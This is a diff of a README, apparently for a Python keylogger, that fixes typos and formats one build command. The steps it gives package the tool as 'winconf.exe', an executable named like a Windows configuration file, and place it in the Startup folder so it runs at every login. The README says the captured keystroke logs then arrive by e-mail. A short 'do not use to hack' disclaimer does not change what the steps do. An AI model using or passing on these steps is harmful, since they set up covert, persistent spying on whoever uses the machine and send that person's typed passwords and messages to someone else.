@@ -12,10 +12,11 @@ Do not use to hack anyone. Don't learn to hack, hack to learn.
 </ul>
 
 ## Part 2
-<p>Open command prompt at python_keylogger directory and tye python setup.py py2exe</p>
+<p>Open command prompt at python_keylogger directory and type the following line</p>
+<code>python setup.py py2exe</code>
 
 ## Part 3
 <p>Make shortcut to dist/winconf.exe and put it to the Startup Windows folder</p>
 
 ## Ready to go!
-<p>Make shure, that your keylogger runs everytime you log in to the system. By every log in, expect e-mail with logs.</p>
+<p>Make sure, that your keylogger runs everytime you log in to the system. By every log in, expect e-mail with logs.</p>
